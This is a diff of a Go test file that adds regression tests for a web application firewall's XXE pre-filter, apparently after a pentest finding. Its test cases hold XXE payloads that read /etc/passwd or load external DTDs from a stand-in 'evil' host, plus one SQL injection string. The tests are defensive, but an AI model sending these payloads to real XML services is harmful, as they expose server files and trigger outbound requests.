@@ -2,6 +2,7 @@ package middleware
 
 import (
 	"context"
+	"io"
 	"net/http"
 	"net/http/httptest"
 	"strings"
@@ -266,5 +267,73 @@ func TestWAF_CRS_BlocksAttacksAllowsBenign(t *testing.T) {
 	// Ordinary API request must pass (no false positive).
 	if code := wafReqH(h, http.MethodGet, "/api/v1/orders?limit=10&sort=created_at"); code != http.StatusOK {
 		t.Errorf("CRS benign: got %d, want 200", code)
+	}
+}
+
+// TestWAF_CRS_BlocksXXE guards the XXE-under-CRS regression found in the live
+// pentest: CRS v4 does not detect XML external-entity declarations (its XML
+// processor eats the DTD prologue, and forcing raw inspection false-positives on
+// the "<?xml" declaration). The Go screenXXE pre-filter closes the gap. Every
+// XXE vector must be blocked; benign XML — including a "<?xml?>" declaration and
+// a +xml suffix type — must pass untouched.
+func TestWAF_CRS_BlocksXXE(t *testing.T) {
+	h := crsHandler(t)
+
+	xxe := []string{
+		`<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`,
+		`<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil/x.dtd">%p;]><r/>`,
+		`<!DOCTYPE r SYSTEM "http://evil/x.dtd"><r>test</r>`,
+		`<!DOCTYPE r PUBLIC "-//x" "file:///etc/passwd"><r/>`,
+	}
+	for _, body := range xxe {
+		if code := wafDo(t, h, http.MethodPost, "/api", "application/xml", body); code != http.StatusForbidden {
+			t.Errorf("XXE not blocked (got %d): %.50s", code, body)
+		}
+	}
+
+	benign := []struct{ ct, body string }{
+		{"application/xml", `<order><id>42</id></order>`},
+		{"application/xml", `<?xml version="1.0" encoding="UTF-8"?><order><id>42</id></order>`},
+		{"application/soap+xml", `<Envelope><Body><get>x</get></Body></Envelope>`},
+	}
+	for _, b := range benign {
+		if code := wafDo(t, h, http.MethodPost, "/api", b.ct, b.body); code != http.StatusOK {
+			t.Errorf("benign XML false-positived (got %d): %.50s", code, b.body)
+		}
+	}
+}
+
+// TestScreenXXE_DetectsAndRewinds unit-tests the pre-filter in isolation. The
+// bug-prone part is the body rewind: after screening, the FULL body must still
+// be readable by Coraza and the backend. Each case asserts both the verdict and
+// that the body reads back byte-for-byte.
+func TestScreenXXE_DetectsAndRewinds(t *testing.T) {
+	cases := []struct {
+		name     string
+		ct, body string
+		want     bool
+	}{
+		{"xxe system", "application/xml", `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`, true},
+		{"xxe public", "application/xml", `<!DOCTYPE r PUBLIC "-//x" "http://evil/x">`, true},
+		{"benign with decl", "application/xml", `<?xml version="1.0"?><order><id>42</id></order>`, false},
+		{"sqli in xml, no xxe", "application/xml", `<r>1 UNION SELECT password FROM users</r>`, false},
+		{"non-xml content-type", "application/json", `{"note":"<!DOCTYPE x SYSTEM y>"}`, false},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			r := httptest.NewRequest(http.MethodPost, "/api", strings.NewReader(tc.body))
+			r.Header.Set("Content-Type", tc.ct)
+			if got := screenXXE(r); got != tc.want {
+				t.Fatalf("screenXXE = %v, want %v", got, tc.want)
+			}
+			// Rewind correctness: the whole body must survive for downstream.
+			rest, err := io.ReadAll(r.Body)
+			if err != nil {
+				t.Fatalf("reading rewound body: %v", err)
+			}
+			if string(rest) != tc.body {
+				t.Fatalf("body corrupted by screening:\n got  %q\n want %q", rest, tc.body)
+			}
+		})
 	}
 }
